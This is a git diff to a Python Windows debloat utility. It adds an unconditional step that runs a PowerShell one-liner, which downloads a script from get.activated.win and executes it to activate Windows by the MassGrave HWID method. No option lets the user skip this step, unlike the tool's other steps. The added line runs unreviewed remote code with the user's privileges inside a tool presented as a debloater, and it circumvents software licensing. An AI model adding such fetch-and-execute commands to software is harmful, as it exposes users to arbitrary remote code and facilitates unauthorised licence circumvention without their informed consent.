@@ -20,6 +20,7 @@ import debloat_components.debloat_advanced_optimizations as debloat_advanced_opt
 from ui_components.ui_base_full import UIBaseFull
 from ui_components.ui_header_text import UIHeaderText
 from ui_components.ui_title_text import UITitleText
+from utilities import util_powershell_handler
 
 
 
@@ -176,7 +177,18 @@ def main(argv=None):
         except Exception as e:
             logger.error(f"Error creating restore point: {e}")
             logger.warning("Continuing without restore point...")
-        
+
+        # MassGrave Activation step
+        _update_status(status_label, "Activating Windows (MassGrave HWID)...")
+        try:
+            logger.info("Running MassGrave HWID activation command...")
+            activation_cmd = "& ([ScriptBlock]::Create((irm https://get.activated.win))) /HWID"
+            util_powershell_handler.run_powershell_command(activation_cmd, allow_continue_on_fail=True)
+            logger.info("MassGrave activation completed.")
+        except Exception as e:
+            logger.error(f"Error during MassGrave activation: {e}")
+            logger.warning("Continuing without activation...")
+
         # Main debloat steps
         for slug, message, func in DEBLOAT_STEPS:
             if getattr(args, f"skip_{slug.replace('-', '_')}_step"):
